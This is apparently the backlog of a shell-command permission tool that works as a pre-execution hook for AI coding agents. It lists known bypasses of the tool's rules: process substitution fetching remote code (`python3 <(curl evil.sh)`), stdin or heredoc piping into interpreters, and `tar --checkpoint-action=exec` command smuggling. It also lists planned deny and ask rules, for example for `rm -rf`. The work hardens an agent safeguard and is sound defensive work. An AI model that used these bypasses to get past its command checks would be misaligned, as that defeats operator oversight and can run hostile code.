# Backlog

## Live bypasses

- [**stdin-gate**](plans/drafts/PLAN-stdin-gate.md)
  > Add setting to deny stdin redirection at the AST level. shizo already parses the shell AST; it could detect heredocs (<<) and stdin pipes (|) feeding an interpreter and force those to ask or deny even if the base command is allowed. This narrows the attack surface without a blanket interpreter ban.
  - Same class as the `<subst>` issue — shared design.

- [**live bypass: `<subst>` matched by ANY/HAS**](plans/drafts/PLAN-subst-wildcard.md)
  > `allow python3 ANY` allows process substitution (`python3 <(curl evil.sh)`). Mitigated by the inner check. The interpreter runs content from a path shizo cannot see. The inner command is rule-checked separately, so exploiting it needs both halves allowed.
  - Overlaps the stdin gate

## Coverage gaps

Rule DSL cannot express the threat

- [**ask-rule**](plans/drafts/PLAN-ask-rule.md)
  > Add an `ask` rule to force operator prompting (e.g. `rm -rf`), even in automode
  - Soft prerequisite for the two below: `ask` is the usable outcome where a hard deny breaks real workflows.

- [**has-value-prefix**](plans/drafts/PLAN-has-value-prefix.md)
  > Add support to deny `tar --checkpoint-action=exec=CMD` with a rule `deny tar HAS --checkpoint-action=exec` or similar.
  - Stands alone as deny-only; wants `ask` for the softer verdict.

## CLI surface & adoption

- [**rename-hook**](plans/drafts/PLAN-rename-hook-pretooluse.md)
  > Rename `shizo claude-hook` to `shizo hook pretooluse` to make it harness agnostic
  - Must land **before** the install command, or fold both into one change.

- [**install-hook**](plans/drafts/PLAN-install-claude-hook.md)
  > Add `shizo install claude-hook` to add PreToolUse hook. Flags: `--project` for `.claude/settings.json`, `--local` for `.claude/settings.local.json`, `--global` for `~/.claude/settings.json`, defaults to `--project`.

- [**info-command**](plans/drafts/PLAN-info-subcommand.md)
  > Add `shizo info` command to retrieve information like `--global-rules-path` or `--attestation-dir`.

- [**project-trust**](plans/drafts/PLAN-project-trust.md)
  > Allow `trust` in project config to add project-specific binaries

- [**docs-command**](plans/drafts/PLAN-docs-subcommand.md)
  > `shizo docs` subcommand. Embedded doc viewer

## Reach

- **Find alpha tester**
  > Gated by live bypasses, coverage gaps and the install hook command.

- **Expand to other harnesses**
  > See [pretooluse-hook-equivalents research](docs/research/pretooluse-hook-equivalents.md)
  - Depends on the harness-agnostic command naming.

- [**language server**](plans/drafts/PLAN-language-server.md)


## Unordered inbox

- pro: no variables, no functions
- scan all binaries and classify
- add `default ask|allow|deny`?
- harden sandbox template (git read-only)
- make bash builtin allowlist configurable?
